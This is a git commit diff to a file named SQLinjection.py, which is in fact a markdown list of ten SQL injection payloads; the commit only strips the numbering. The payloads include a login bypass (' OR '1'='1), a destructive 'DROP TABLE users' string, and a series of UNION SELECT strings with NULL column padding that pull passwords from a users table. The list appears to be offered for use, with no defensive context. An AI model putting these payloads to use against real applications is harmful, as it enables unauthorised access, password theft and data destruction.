2b2f07b1ec399d04f4dbc94c3c82574ea3a76e17
Paige <102603571+Clasikpaige@users.noreply.github.com>
2023-07-15 08:12:53 +0100

    Update SQLinjection.py

--- SQLinjection.py
+++ SQLinjection.py
@@ -1,12 +1,12 @@
 ## SQL Injection Payloads
 
-1. Payload 1: `' OR '1'='1`
-2. Payload 2: `' OR '1'='1' --`
-3. Payload 3: `1'; DROP TABLE users;--`
-4. Payload 4: `1'; SELECT * FROM users WHERE username = 'admin' --`
-5. Payload 5: `1' UNION SELECT password FROM users --`
-6. Payload 6: `1' UNION SELECT NULL, password FROM users --`
-7. Payload 7: `1' UNION SELECT NULL, NULL, password FROM users --`
-8. Payload 8: `1' UNION SELECT NULL, NULL, NULL, password FROM users --`
-9. Payload 9: `1' UNION SELECT NULL, NULL, NULL, NULL, password FROM users --`
-10. Payload 10: `1' UNION SELECT NULL, NULL, NULL, NULL, NULL, password FROM users --
+Payload 1: `' OR '1'='1`
+Payload 2: `' OR '1'='1' --`
+Payload 3: `1'; DROP TABLE users;--`
+Payload 4: `1'; SELECT * FROM users WHERE username = 'admin' --`
+Payload 5: `1' UNION SELECT password FROM users --`
+Payload 6: `1' UNION SELECT NULL, password FROM users --`
+Payload 7: `1' UNION SELECT NULL, NULL, password FROM users --`
+Payload 8: `1' UNION SELECT NULL, NULL, NULL, password FROM users --`
+Payload 9: `1' UNION SELECT NULL, NULL, NULL, NULL, password FROM users --`
+Payload 10: `1' UNION SELECT NULL, NULL, NULL, NULL, NULL, password FROM users --
